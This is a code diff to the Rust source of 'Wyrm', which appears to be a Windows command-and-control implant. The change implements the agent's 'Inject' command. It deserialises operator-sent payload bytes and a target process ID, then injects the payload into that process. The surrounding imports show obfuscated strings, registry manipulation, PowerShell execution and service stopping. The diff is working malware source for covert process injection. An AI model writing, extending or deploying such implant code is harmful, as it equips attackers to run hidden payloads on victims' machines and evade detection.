@@ -12,7 +12,9 @@ use rand::{
 use serde::Serialize;
 use shared::{
     net::CompletedTasks,
-    tasks::{Command, FirstRunData, Task, WyrmResult, tasks_contains_kill_agent},
+    tasks::{
+        Command, FirstRunData, InjectInnerForPayload, Task, WyrmResult, tasks_contains_kill_agent,
+    },
 };
 use str_crypter::{decrypt_string, sc};
 use windows_sys::{
@@ -47,7 +49,7 @@ use crate::{
         registry::{reg_add, reg_del, reg_query},
         shell::run_powershell,
     },
-    spawn_inject::{Spawn, SpawnMethod},
+    spawn_inject::{Inject, InjectMethod, Spawn, SpawnMethod},
     utils::{
         comptime::translate_build_artifacts, console::print_info, proxy::resolve_web_proxy,
         strings::generate_mutex_name, svc_controls::stop_svc_and_exit, time_utils::epoch_now,
@@ -374,7 +376,20 @@ impl Wyrm {
                     self.push_completed_task(&task, Some(result));
                 }
                 Command::Inject => {
-                    // todo
+                    let Some(Ok(metadata)) = task.deserialise_metadata::<InjectInnerForPayload>()
+                    else {
+                        let msg = sc!("Could not parse metadata for inject.", 97).unwrap();
+                        print_failed(msg);
+                        self.push_completed_task::<String>(&task, None);
+                        continue;
+                    };
+
+                    let result = Inject::inject_wyrm(
+                        &metadata.payload_bytes,
+                        InjectMethod::Virgin,
+                        metadata.pid,
+                    );
+
                     self.push_completed_task::<String>(&task, None);
                 }
             }
